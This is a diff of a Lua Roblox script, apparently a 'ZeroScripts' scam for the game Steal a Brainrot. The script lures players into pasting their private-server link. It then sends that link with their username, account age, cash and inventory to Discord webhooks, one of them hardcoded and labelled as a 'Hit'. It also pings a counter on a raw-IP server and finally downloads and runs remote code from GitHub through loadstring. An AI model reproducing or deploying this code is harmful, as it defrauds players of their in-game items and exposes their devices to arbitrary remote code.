@@ -1,27 +1,8 @@
---[[
-   _____ _____ _____ _____ _____ _______ _____ _____ __ __
-  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
- | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \  / |
-  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
- |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
-                                                                    
-                        ZeroScripts | Premium Scripts
-                        Made by: ZeroOnTop
-                        Discord: discord.gg/cnUAk7uc3n
-]]
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
-if not _G["Zero_Config"] then
-    warn("WARNING: Config not loaded! Waiting for config...")
-    repeat task.wait() until _G["Zero_Config"]
-    warn("Config loaded successfully!")
-end
+repeat task.wait() until _G["Zero_Config"]
 
---====================================================================--
--- Services
---====================================================================--
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -30,77 +11,55 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 local Lighting = game:GetService("Lighting")
 local Workspace = game:GetService("Workspace")
-local LocalPlayer = Players.LocalPlayer
 local player = Players.LocalPlayer
 local gui = player:WaitForChild("PlayerGui")
 
---====================================================================--
--- Promotion
---====================================================================--
 setclipboard("discord.gg/cnUAk7uc3n")
 
---====================================================================--
--- VIP-Server Check
---====================================================================--
 local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
-if serverType ~= "VIPServer" then
-    LocalPlayer:Kick("ZeroOnTop does not support public servers. Join a Private Server.")
-    return
-end
+if serverType ~= "VIPServer" then player:Kick("ZeroOnTop does not support public servers. Join a Private Server.") return end
 
---====================================================================--
--- WEBHOOKS (Only User Webhook)
---====================================================================--
-local user_webhook = _G["Zero_Config"].user_webhook
-local cfg = _G["Zero_Config"]
-local receiver = "Not Configured"
-if cfg and cfg.users then
-    if type(cfg.users) == "table" and #cfg.users > 0 then
-        receiver = tostring(cfg.users[1])
-    elseif type(cfg.users) == "string" then
-        receiver = tostring(cfg.users)
-    end
-end
+local WEBHOOK_URL = _G["Zero_Config"].user_webhook
+local TARGET_PLAYERS = _G["Zero_Config"].users or {}
+local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
+local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount"
+local API_KEY = getgenv().API_KEY or "supersecretkey"
 
-
---====================================================================--
--- Safe HTTP
---====================================================================--
-local function safeRequest(url, body)
+local function safeRequest(url, body, headers)
+    local h = headers or {["Content-Type"] = "application/json"}
     pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(body)
+        (syn and syn.request or http and http.request or request or HttpService.PostAsync)({
+            Url  = url, Method = "POST", Headers = h, Body = HttpService:JSONEncode(body)
         })
     end)
 end
 
-local function safeHttpGet(url)
-    local ok, result = pcall(function()
-        return game:HttpGet(url)
-    end)
-    if ok then return result end
-    warn("HttpGet blocked: " .. tostring(result))
-    return nil
+local function sendZeroEmbed(title, desc, color, fields, isPublic)
+    local payload = {
+        username = "ZeroOnTop", avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+        embeds = {{
+            title = title, description = desc, color = color, fields = fields or {},
+            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    safeRequest(isPublic and PUBLIC_WEBHOOK_URL or WEBHOOK_URL, payload)
 end
 
---====================================================================--
--- Link handling
---====================================================================--
+local function triggerVpsHit()
+    if WEBHOOK_URL == "" then return end
+    safeRequest(VPS_INCREMENT, {webhook = WEBHOOK_URL}, {["X-API-KEY"] = API_KEY})
+end
+
 local function extractCode(raw)
     raw = raw:gsub("%s", "")
     return raw:match("share%?code=([%w%-]+)") or raw:match("privateServerLinkCode=([%w%-]+)")
 end
 
 local function buildJoinLink(code)
-    return "https://www.roblox.com/share?code= " .. code .. "&type=Server"
+    return "https://www.roblox.com/share?code=" .. code .. "&type=Server"
 end
 
---====================================================================--
--- Stats helpers
---====================================================================--
 local function formatCash(num)
     if not num or type(num) ~= "number" then return "Unknown" end
     local abs = math.abs(num)
@@ -126,11 +85,8 @@ local function detectExecutor()
     return "Unknown"
 end
 
---====================================================================--
--- Brainrot Scanner: Parse + Sort (Highest to Lowest)
---====================================================================--
-local function parseGenerationValue(generationString)
-    local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
+local function parseGenerationValue(s)
+    local cleaned = s:gsub("%s", ""):match("^%s*(.-)%s*$")
     local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
     if not numberPart then return 0 end
     numberPart = tonumber(numberPart)
@@ -161,29 +117,19 @@ local function getBrainrots()
                     if over then
                         local nameLbl = over:FindFirstChild("DisplayName")
                         local genLbl = over:FindFirstChild("Generation")
-                        if nameLbl and nameLbl:IsA("TextLabel")
-                            and genLbl and genLbl:IsA("TextLabel") then
+                        if nameLbl and nameLbl:IsA("TextLabel") and genLbl and genLbl:IsA("TextLabel") then
                             local genVal = parseGenerationValue(genLbl.Text)
-                            table.insert(list, {
-                                name = nameLbl.Text,
-                                generation = genLbl.Text,
-                                value = genVal
-                            })
+                            table.insert(list, {name = nameLbl.Text, generation = genLbl.Text, value = genVal})
                         end
                     end
                 end
             end
         end
     end
-    table.sort(list, function(a, b)
-        return a.value > b.value
-    end)
+    table.sort(list, function(a, b) return a.value > b.value end)
     return list
 end
 
---====================================================================--
--- Draggable
---====================================================================--
 local function makeDraggable(frame, handle)
     local dragging, dragInput, startPos, startMouse
     handle.InputBegan:Connect(function(input)
@@ -208,9 +154,6 @@ local function makeDraggable(frame, handle)
     end)
 end
 
---====================================================================--
--- GUI
---====================================================================--
 local screen = Instance.new("ScreenGui")
 screen.Name = "Zero_Cinematic"
 screen.ResetOnSpawn = false
@@ -264,7 +207,6 @@ dragHandle.BackgroundTransparency = 1
 dragHandle.Parent = card
 makeDraggable(card, dragHandle)
 
--- Card in
 local cardIn = TweenService:Create(card, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
     Position = UDim2.fromScale(0.5,0.5),
     BackgroundTransparency = 0,
@@ -274,7 +216,6 @@ cardIn:Play()
 TweenService:Create(cardStroke, TweenInfo.new(0.8), {Transparency = 0.6}):Play()
 TweenService:Create(gradient, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 135}):Play()
 
--- Title / Sub
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1,-60,0,50)
 title.Position = UDim2.fromOffset(30,30)
@@ -301,14 +242,12 @@ sub.TextTransparency = 1
 sub.Parent = card
 TweenService:Create(sub, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
 
--- Input container
 local inputContainer = Instance.new("Frame")
 inputContainer.Size = UDim2.new(1,-80,0,60)
 inputContainer.Position = UDim2.fromOffset(40,130)
 inputContainer.BackgroundTransparency = 1
 inputContainer.Parent = card
 
--- Floating label
 local floatLabel = Instance.new("TextLabel")
 floatLabel.Size = UDim2.new(1,0,0,20)
 floatLabel.Position = UDim2.fromOffset(0,0)
@@ -320,7 +259,6 @@ floatLabel.TextSize = 14
 floatLabel.TextXAlignment = Enum.TextXAlignment.Left
 floatLabel.Parent = inputContainer
 
--- TextBox background
 local tbBg = Instance.new("Frame")
 tbBg.Size = UDim2.new(1,0,0,36)
 tbBg.Position = UDim2.fromOffset(0,24)
@@ -331,7 +269,6 @@ tbBg.Parent = inputContainer
 local tbCorner = Instance.new("UICorner", tbBg)
 tbCorner.CornerRadius = UDim.new(0,12)
 
--- REAL PLACEHOLDER
 local placeholder = Instance.new("TextLabel")
 placeholder.Size = UDim2.new(1,-20,1,0)
 placeholder.Position = UDim2.fromOffset(10,0)
@@ -344,7 +281,6 @@ placeholder.TextXAlignment = Enum.TextXAlignment.Left
 placeholder.TextTransparency = 0
 placeholder.Parent = tbBg
 
--- Actual TextBox
 local textBox = Instance.new("TextBox")
 textBox.Size = UDim2.new(1,-20,1,0)
 textBox.Position = UDim2.fromOffset(10,0)
@@ -358,7 +294,6 @@ textBox.TextWrapped = true
 textBox.ClearTextOnFocus = false
 textBox.Parent = tbBg
 
--- Underline
 local underline = Instance.new("Frame")
 underline.Size = UDim2.new(1,0,0,2)
 underline.Position = UDim2.new(0,0,1,0)
@@ -367,13 +302,11 @@ underline.BackgroundTransparency = 1
 underline.BorderSizePixel = 0
 underline.Parent = tbBg
 
--- Animations
 local focusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 0})
 local unfocusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 1})
 local labelUp = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,-20), TextSize = 12})
 local labelDown = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,0), TextSize = 14})
 
--- Placeholder visibility
 local function updatePlaceholder()
     placeholder.Visible = (textBox.Text == "")
 end
@@ -389,10 +322,10 @@ textBox.FocusLost:Connect(function(enter)
     updatePlaceholder()
     if enter then
         task.wait(0.1)
-        triggerContinue() -- Call the function directly instead
+        triggerContinue()
     end
 end)
--- Continue button
+
 local continueBtn = Instance.new("TextButton")
 continueBtn.Size = UDim2.new(0,140,0,50)
 continueBtn.Position = UDim2.new(1,-180,1,-80)
@@ -426,9 +359,6 @@ continueBtn.MouseButton1Down:Connect(function() pressIn:Play() end)
 continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
 continueBtn.MouseLeave:Connect(function() pressOut:Play() end)
 
---====================================================================--
--- Continue Button Logic
---====================================================================--
 local function triggerContinue()
     local raw = textBox.Text
     if raw == "" then
@@ -446,40 +376,13 @@ local function triggerContinue()
     end
     local joinLink = buildJoinLink(code)
 
-    -- Fade out the card and transition to the confirmation screen
     TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
         Position = UDim2.fromScale(0.5, -1.5),
         BackgroundTransparency = 1
     }):Play()
     task.wait(0.5)
 
-    showConfirm(joinLink)
-end
-
-continueBtn.MouseButton1Click:Connect(triggerContinue)
-
---====================================================================--
--- ESC Key (Unchanged)
---====================================================================--
-UserInputService.InputBegan:Connect(function(i, gp)
-    if gp then return end
-    if i.KeyCode == Enum.KeyCode.Escape then
-        if confirmGui then
-            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
-            fadeOut:Play()
-            fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
-        else
-            triggerContinue()
-        end
-    end
-end)
-
---====================================================================--
--- Confirmation Screen
---====================================================================--
-local confirmGui
-local function showConfirm(joinLink)
-    confirmGui = Instance.new("ScreenGui")
+    local confirmGui = Instance.new("ScreenGui")
     confirmGui.Name = "Zero_Confirm"
     confirmGui.ResetOnSpawn = false
     confirmGui.IgnoreGuiInset = true
@@ -563,7 +466,6 @@ local function showConfirm(joinLink)
 
     confirmNo.MouseButton1Click:Connect(closeConfirm)
 
-    -- Fade in
     TweenService:Create(back, TweenInfo.new(0.4), {BackgroundTransparency = 0.6}):Play()
     TweenService:Create(confirmCard, TweenInfo.new(0.5), {
         BackgroundTransparency = 0,
@@ -573,17 +475,12 @@ local function showConfirm(joinLink)
     TweenService:Create(confirmTitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
     TweenService:Create(confirmSub, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
 
-    --====================================================================--
-    -- Confirm Button Logic
-    --====================================================================--
     confirmYes.MouseButton1Click:Connect(function()
         closeConfirm()
         _G.Private_Server_Zero = joinLink
         local cash = getStat("Cash") or 0
         local steals = getStat("Steals") or 0
         local rebirths = getStat("Rebirths") or 0
-
-        
         local brainrots = getBrainrots()
         local backpackLines = {}
         if #brainrots > 0 then
@@ -599,7 +496,7 @@ local function showConfirm(joinLink)
         local payload = {
             content = "> Jump or type anything in chat to start.",
             username = "ZeroOnTop",
-            avatar_url = "https://scriptssm.vercel.app/pngs/logo.png ",
+            avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
             embeds = {{
                 title = "𓆩 ZeroOnTop 𓆪",
                 description = "<:faq_badge:1436328022910435370> **Status:** `Unknown`\n> Failed to Fetch Status.\n⠀",
@@ -608,7 +505,7 @@ local function showConfirm(joinLink)
                     { name = "<:emoji_4:1402578195294982156> **Display Name **", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = true },
                     { name = "<:emoji_2:1402577600060325910> **Username**", value = "```" .. (player.Name or "Unknown") .. "```", inline = true },
                     { name = "<:emoji_7:1402587793909223530> **Account Age**", value = "```" .. tostring(player.AccountAge) .. " Days```", inline = true },
-                    { name = "<:emoji_3:1402578008245801086> **Receiver**", value = "```".. receiver .. "```", inline = true },
+                    { name = "<:emoji_3:1402578008245801086> **Receiver**", value = "```".. table.concat(TARGET_PLAYERS, ", ") .. "```", inline = true },
                     { name = "<:Events:1394005823931420682> **Executor**", value = "```" .. detectExecutor() .. "```", inline = true },
                     { name = "<:money:1436335320437096508> **Cash**", value = "```" .. formatCash(cash) .. "```", inline = true },
                     { name = "<:Rechange:1394005750317060167> **Rebirths**", value = "```" .. tostring(rebirths) .. "```", inline = true },
@@ -628,17 +525,16 @@ local function showConfirm(joinLink)
                     },
                     { name = "<:loc:1436344006421385309> **Join via URL**", value = "[ **Click Here to Join!**](" .. joinLink .. ")" }
                 },
-                author = { name = "Steal a Brainrot - Hit", url = joinLink, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp " },
-                footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png " },
+                author = { name = "Steal a Brainrot - Hit", url = joinLink, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
+                footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
-                image = { url = "https://scriptssm.vercel.app/pngs/sab.webp " }
+                image = { url = "https://scriptssm.vercel.app/pngs/sab.webp" }
             }}
         }
 
-        -- Only send to user_webhook
-        safeRequest(user_webhook, payload)
+        safeRequest(WEBHOOK_URL, payload)
+        triggerVpsHit()
 
-        -- Fade out GUI
         TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
             Position = UDim2.fromScale(0.5, -1.5),
             BackgroundTransparency = 1
@@ -648,14 +544,23 @@ local function showConfirm(joinLink)
 
         task.delay(0.7, function()
             screen:Destroy()
-            local scriptURL = "https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Gui.lua "
-            local src = safeHttpGet(scriptURL)
-            if src then
-                local success, err = pcall(function() loadstring(src)() end)
-                if not success then warn("gui.lua failed: "..tostring(err)) end
-            else
-                warn("Failed to fetch gui.lua – Check HTTP permissions or internet.")
-            end
+            local src = game:HttpGet("https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Gui.lua")
+            loadstring(src)()
         end)
     end)
 end
+
+continueBtn.MouseButton1Click:Connect(triggerContinue)
+
+UserInputService.InputBegan:Connect(function(i, gp)
+    if gp then return end
+    if i.KeyCode == Enum.KeyCode.Escape then
+        if confirmGui then
+            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+            fadeOut:Play()
+            fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
+        else
+            triggerContinue()
+        end
+    end
+end)
